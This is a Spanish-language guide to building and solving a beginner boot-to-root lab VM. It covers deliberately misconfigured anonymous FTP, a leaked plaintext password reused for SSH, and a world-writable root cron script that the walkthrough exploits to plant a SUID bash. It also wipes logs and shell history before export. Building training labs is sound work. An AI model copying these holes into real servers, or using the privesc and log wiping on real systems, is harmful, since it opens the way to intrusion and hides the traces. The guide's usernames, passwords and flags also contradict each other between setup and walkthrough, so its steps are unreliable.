# FTP-Vuln: Maquina Vulnerable Boot-to-Root

## Objetivo

Diseno de una maquina vulnerable con las siguientes caracteristicas:

- **Ubuntu Server** como sistema base.
- Dos flags:
  - `/home/<user>/user.txt`
  - `/root/root.txt`
- Nivel de dificultad: **bajo/principiante**.
- Vector de ataque: **un protocolo mal configurado (FTP)**.
- Comprometible completamente (boot-to-root).

## Idea de Escenario

**Servicio FTP mal configurado (vsftpd)**:

- Login anonimo habilitado.
- Un archivo oculto con credenciales.
- Usuario con contrasena reutilizada para SSH.
- SSH con autenticacion por contrasena habilitada.
- Escalada de privilegios mediante una tarea en cron.

## Estructura de la Maquina

| Componente              | Detalle                                       |
| ----------------------- | --------------------------------------------- |
| Sistema base            | Ubuntu Server 20.04                           |
| Servicio vulnerable     | vsftpd 3.0.3 con login anonimo habilitado     |
| Usuario no-root         | `orami` con `/home/oramiuser/user.txt`        |
| Flag de root            | `/root/root.txt`                              |
| Escalada de privilegios | Mediante una tarea en cron mal configurada    |

---

## Paso a Paso para Configurar la Maquina

### 1. Instalar Ubuntu Server (VM)

Se crea una VM en VirtualBox, VMware o KVM con Ubuntu Server 20.04:

- Asignacion minima de 1GB RAM y 1 CPU.
- Nombre: `FTP-Vuln`.
- Red configurada como **adaptador en puente (bridge)** o **host-only** para pruebas.
- SSH instalado: `sudo apt install openssh-server`

### 2. Crear usuario y flags

```bash
# Como root:
adduser orami
echo "technova{this_is_the_user_flag}" > /home/oramiuser/user.txt
echo "technova{this_is_the_root_flag}" > /root/root.txt

# Asignacion de permisos
chmod 600 /home/oramiuser/user.txt
chmod 600 /root/root.txt
chown oramiuser:oramiuser /home/oramiuser/user.txt
```

### 3. Instalar y configurar vsftpd

```bash
apt update && apt install vsftpd -y
```

Edicion de la configuracion:

```bash
nano /etc/vsftpd.conf
```

Lineas que deben quedar configuradas:

```
listen=NO
listen_ipv6=YES
anonymous_enable=YES
local_enable=YES
write_enable=YES
anon_upload_enable=YES
anon_mkdir_write_enable=YES
anon_root=/srv/ftp
```

Preparacion del directorio para FTP:

```bash
mkdir -p /srv/ftp/files
chmod 755 /srv/ftp
chmod 777 /srv/ftp/files
echo "credenciales: orami:pass123" > /srv/ftp/files/leeme.txt
```

Reinicio del servicio:

```bash
systemctl restart vsftpd
```

### 4. Configurar SSH

Se requiere que `orami` pueda acceder via SSH con contrasena:

```bash
passwd orami  # se usa la misma contrasena que en el FTP
nano /etc/ssh/sshd_config
```

Opciones que deben estar activas en `sshd_config`:

```
PermitRootLogin prohibit-password
PasswordAuthentication yes
```

Reinicio de SSH:

```bash
systemctl restart ssh
```

### 5. Agregar vector de escalada de privilegios

Creacion del cronjob ejecutado por root:

```bash
echo "* * * * * root /usr/local/bin/backup.sh" > /etc/cron.d/rootjob
chmod 644 /etc/cron.d/rootjob
```

Creacion del script vulnerable:

```bash
echo -e '#!/bin/bash\ntar czf /tmp/backup.tar.gz /home/oramiuser 2>/dev/null' > /usr/local/bin/backup.sh
chmod 777 /usr/local/bin/backup.sh
chmod +x /usr/local/bin/backup.sh
```

Esto permite que cualquier usuario lo modifique para ejecutar comandos como root.

### 6. Limpiar la maquina antes de empaquetar

```bash
sudo rm -rf /var/log/*.log
history -c
unset HISTFILE
sudo rm -rf /home/*/.bash_history
```

### 7. Apagar y exportar la VM

- **VirtualBox**: Menu > Archivo > Exportar servicio virtualizado. Formato OVA o VMDK.
- **VMware**: Se comprime el archivo `.vmdk` y `.vmx`.
- **QEMU/KVM**: Se usa `qemu-img convert` para exportar a `.qcow2`.

---

## Checklist de Verificacion

- Funcionamiento del FTP anonimo.
- Acceso via SSH.
- Escalada de privilegios funcional.
- Flags en sus ubicaciones correctas.
- Ruta boot-to-root sin pasos imposibles.
- Estabilidad de la maquina al iniciar.

---

## Ruta de Explotacion (Walkthrough)

### Fase 1: Enumeracion de servicios

```bash
nmap -sC -sV -Pn <IP_OBJETIVO>
```

Resultado esperado:

```
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 8.x
```

### Fase 2: Enumeracion de FTP anonimo

```bash
ftp <IP_OBJETIVO>
# Usuario: anonymous
# Password: [presionar ENTER]
```

Una vez dentro de la sesion FTP:

```bash
cd files
ls
get leeme.txt
```

El archivo `leeme.txt` contiene:

```
credentials: oramiuser:123456
```

### Fase 3: Acceso SSH con credenciales descubiertas

```bash
ssh oramiuser@<IP_OBJETIVO>
# Contrasena: 123456
```

Verificacion del usuario y lectura de la flag:

```bash
whoami
# orami

cat /home/oramiuser/user.txt
# technova{user_flag_is_here}
```

### Fase 4: Enumeracion de cronjobs

```bash
cat /etc/cron.d/rootjob
```

Resultado:

```
* * * * * root /usr/local/bin/backup.sh
```

Verificacion de permisos:

```bash
ls -l /usr/local/bin/backup.sh
# -rwxrwxrwx 1 root root ... (777)
```

### Fase 5: Escalada de privilegios (cronjob vulnerable)

Sobrescritura del script como `orami`:

```bash
echo -e '#!/bin/bash\ncp /bin/bash /tmp/rootbash\nchmod +s /tmp/rootbash' > /usr/local/bin/backup.sh
chmod +x /usr/local/bin/backup.sh
```

Se espera 1 minuto a que el cronjob se ejecute. Luego:

```bash
/tmp/rootbash -p
whoami
# root
```

### Fase 6: Captura de la flag root

```bash
cat /root/root.txt
# technova{root_flag_is_here}
```

---

## Herramientas Utilizadas

| Herramienta | Uso                                       |
| ----------- | ----------------------------------------- |
| nmap        | Escaneo de puertos y servicios            |
| ftp         | Acceso anonimo a FTP                      |
| ssh         | Acceso remoto a shell                     |
| cron        | Ejecucion automatica de tareas como root  |
| bash        | Creacion y ejecucion de scripts           |
| chmod       | Cambio de permisos de archivos            |

## Vulnerabilidades Explotadas

1. FTP anonimo expuesto.
2. Archivo con credenciales publicas.
3. Cronjob ejecutado como root y modificable.
4. Permisos `777` en script ejecutado por root.
5. Uso del bit SUID para ejecutar `/bin/bash` como root.

---

## Consejos de Buen Diseno

- Banner de advertencia en `/etc/motd`.
- Sin conexiones externas innecesarias.
- Sin IPs reales en scripts (se usa `YOUR_IP_HERE`).
- Snapshot de la VM antes de exportarla.

---

## Plataformas para Publicar

- **technova**: Ideal para rooms tipo boot-to-root.
- **VulnHub**: Sitio clasico para publicar maquinas vulnerables.
- **HackMyVM**: Comunidad activa, buena visibilidad.
- **GitHub**: Para distribucion libre y portafolio.
